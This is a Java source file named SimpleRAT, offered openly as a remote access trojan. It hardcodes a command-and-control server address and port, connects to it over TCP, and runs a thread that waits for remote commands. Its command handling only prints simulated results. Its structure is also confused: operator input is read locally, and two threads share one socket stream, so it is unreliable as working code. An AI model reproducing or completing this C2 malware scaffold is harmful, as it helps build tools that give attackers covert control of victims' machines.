import java.io.*;
import java.net.*;
import java.util.Scanner;
 
public class SimpleRAT {
 
    // ====================================================================
    // --- GLOBAL RAT CONFIGURATION (Hardcoded Inside) ---
    // ====================================================================
 
    private static final String C2_HOST = "192.168.1.1"; // IP address or domain of the C2 server
    private static final int C2_PORT = 4444;           // Port the C2 server is listening on
    private static final int BUFFER_SIZE = 1024;       // Size of data chunks to receive
 
    // ====================================================================
    // --- RAT STATE VARIABLES ---
    // ====================================================================
 
    private static Socket clientSocket = null;
    private static PrintWriter out;
    private static BufferedReader in;
    private static volatile boolean running = true;
 
    public static void main(String[] args) {
        System.out.println("=============================================");
        System.out.println("        Simple Java RAT Initializing         ");
        System.out.println("=============================================");
 
        connectToC2();
 
        if (clientSocket != null && clientSocket.isConnected()) {
            System.out.println("\n[RAT] Successfully connected to C2 Server.");
 
            // Start the thread to continuously listen for incoming C2 commands
            Thread receiverThread = new Thread(new DataReceiver());
            receiverThread.start();
 
            // Main thread handles user input (sending commands)
            Scanner scanner = new Scanner(System.in);
            while (running) {
                System.out.print("\nEnter command (e.g., status, get_info, shutdown): ");
                String command = scanner.nextLine();
                if (command.equalsIgnoreCase("shutdown")) {
                    sendCommand("shutdown");
                    running = false;
                } else if (!command.isEmpty()) {
                    sendCommand(command);
                }
            }
 
            // Cleanup
            System.out.println("\n[RAT] Shutting down connection.");
            closeConnection();
            receiverThread.interrupt();
        } else {
            System.err.println("\n[RAT] Failed to connect to C2 Server. Exiting.");
        }
    }
 
    /**
     * Establishes the TCP connection to the C2 server.
     */
    private static void connectToC2() {
        try {
            System.out.println("[RAT] Attempting to connect to C2 server at " + C2_HOST + ":" + C2_PORT + "...");
            clientSocket = new Socket(C2_HOST, C2_PORT);
 
            // Set up input/output streams
            out = new PrintWriter(clientSocket.getOutputStream(), true);
            in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
 
        } catch (UnknownHostException e) {
            System.err.println("[RAT] Error: Unknown host address: " + C2_HOST);
        } catch (ConnectException e) {
            System.err.println("[RAT] Error: Connection refused. Is the C2 server running? (" + C2_HOST + ":" + C2_PORT + ")");
        } catch (IOException e) {
            System.err.println("[RAT] An unexpected IO error occurred during connection: " + e.getMessage());
        }
    }
 
    /**
     * Sends a command to the C2 server and waits for a response.
     * @param command The command string to send.
     */
    private static void sendCommand(String command) {
        if (clientSocket == null || !clientSocket.isConnected()) {
            System.out.println("[RAT] ERROR: Not connected to the C2 server. Cannot send command.");
            return;
        }
        System.out.println("[RAT] Sending command: '" + command + "'");
        try {
            out.println(command);
            // Wait for the response from the C2 server
            String response = in.readLine();
            if (response != null) {
                System.out.println("[C2 Response]: " + response);
            } else {
                System.out.println("[C2 Response]: No response received from server.");
            }
        } catch (IOException e) {
            System.err.println("[RAT] Error sending or receiving data: " + e.getMessage());
        }
    }
 
    /**
     * Thread responsible for continuously listening for commands from the C2 server.
     */
    private static class DataReceiver implements Runnable {
        @Override
        public void run() {
            String inputLine;
            try {
                while (running && (inputLine = in.readLine()) != null) {
                    System.out.println("\n[C2 Command Received]: " + inputLine);
 
                    if (inputLine.equalsIgnoreCase("shutdown")) {
                        System.out.println("[RAT] Shutdown command received. Terminating RAT.");
                        running = false;
                        break;
                    }
 
                    // --- Simple Simulated Execution Logic ---
                    if (inputLine.equalsIgnoreCase("status")) {
                        System.out.println("[RAT] Running status: System operational.");
                    } else if (inputLine.equalsIgnoreCase("get_info")) {
                        // Simulate gathering some info
                        System.out.println("[RAT] Gathering system info: OS=Java Runtime, Memory=8GB (Simulated).");
                    } else {
                        System.out.println("[RAT] Executing custom command: " + inputLine);
                    }
                }
            } catch (IOException e) {
                if (running) {
                    System.err.println("[RAT] Connection lost with C2 server: " + e.getMessage());
                    running = false;
                }
            }
        }
    }
 
    /**
     * Closes all network resources.
     */
    private static void closeConnection() {
        running = false;
        try {
            if (out != null) out.close();
            if (in != null) in.close();
            if (clientSocket != null && !clientSocket.isClosed()) {
                clientSocket.close();
            }
        } catch (IOException e) {
            System.err.println("[RAT] Error closing sockets: " + e.getMessage());
        }
    }
}
